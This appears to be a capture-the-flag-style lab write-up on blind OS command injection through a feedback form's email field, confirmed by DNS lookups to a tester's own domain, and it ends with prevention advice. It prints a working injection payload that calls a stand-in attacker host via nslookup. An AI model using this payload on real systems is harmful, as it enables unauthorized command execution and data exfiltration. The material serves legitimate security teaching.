==================================================
Lab 4: Blind OS Command Injection with Out-of-Band Interaction
==================================================

=======================
WHAT THIS LAB IS ABOUT
=======================

A website has a feedback form. When you submit it, the server runs a shell command using the details you entered.
The command's output is not shown in the response, and the server does not wait for the command to finish in a way we can measure.
Instead, we make the server perform a DNS lookup to a domain we control. If that lookup arrives, the injection worked.

Goal: trigger a DNS lookup to the Collaborator domain.

==============================
HOW THE WEBSITE NORMALLY WORKS
==============================

When you submit feedback, the browser sends the name, email, subject, and message to the server.
The server uses these values in a shell command, but the response page does not show anything from that command.

=======================
 WHAT IS THE PROBLEM
=======================

The email field is placed directly into a shell command without any filtering.
That lets us add our own commands, and the server runs them even though we never see their output.

===========================
THREE THINGS TO UNDERSTAND
===========================

Double pipe (||): The second command runs only if the first one fails. The first part, x, is not a valid command, so nslookup runs.
nslookup: This command asks DNS to resolve a hostname. The server must contact a DNS server to do this.
Out-of-band (OOB): A channel outside the normal HTTP response. Here, the channel is the DNS lookup. The server sends the lookup to a domain we control, and we watch for it there.

======================================
THE ATTACK
======================================

We put this value into the email field:

x||nslookup x.YOUR-DOMAIN||

The server builds a command that roughly looks like:

mail x||nslookup x.YOUR-DOMAIN||

The first part fails, so the shell runs nslookup. The lookup asks DNS to resolve x.YOUR-DOMAIN.
Because YOUR-DOMAIN belongs to us, the DNS request reaches our server, which logs it.
The x. is just a label in front of the domain, so the hostname stays valid.

============================
HOW TO SOLVE IT MANUALLY
============================

Open the lab and go to the feedback page.
Fill in the fields and enter the payload above in the email field, using your Collaborator domain.
Submit the form. The lab is marked as solved once the DNS lookup reaches Burp Collaborator.

With Burp Suite Professional, you can also insert the Collaborator payload directly from the request.

=========================
WHAT THIS SCRIPT DOES
=========================

* It loads the feedback page and extracts the CSRF token using a regular expression.
* It asks for the lab base URL and your interactsh domain.
* It builds the payload, placing the interactsh domain into the email field after x.
* It sends a POST request to /feedback/submit with the token and the payload.
* It prints the status. The DNS hit does not appear in the response, so you check the interactsh terminal to confirm it.

=============================
ONE THING TO KEEP IN MIND
=============================

The lookup can arrive several seconds after the submit, so wait a little before deciding the payload failed.
The script cannot see the DNS hit itself. Only your interactsh or Collaborator log shows it.

=============================
WHY THIS HAPPENS
=============================

The server passes user input directly into a shell command. Commands like nslookup, ping, and curl make network requests,
so an attacker can use them to send data out of the server, even when the response shows nothing.

=============================
HOW TO PREVENT THIS
=============================

Do not pass user input into shell commands. Use the language's built-in functions for the task instead.
If a command must be used, pass user input as a separate, escaped argument, never as part of the command string.

Other good practices:

Validate input, allowing only the characters an email address can contain.
Restrict outbound network access from the server, so it cannot reach arbitrary domains.
Run the application with the lowest permissions it needs.

=============================
 KEY POINTS TO REMEMBER
=============================
Blind injection can be confirmed out-of-band by making the server contact a domain you control.
DNS lookups often get through even when other outbound traffic is blocked, which makes them a common channel.
Never trust input from a user, even when the output is hidden from them.
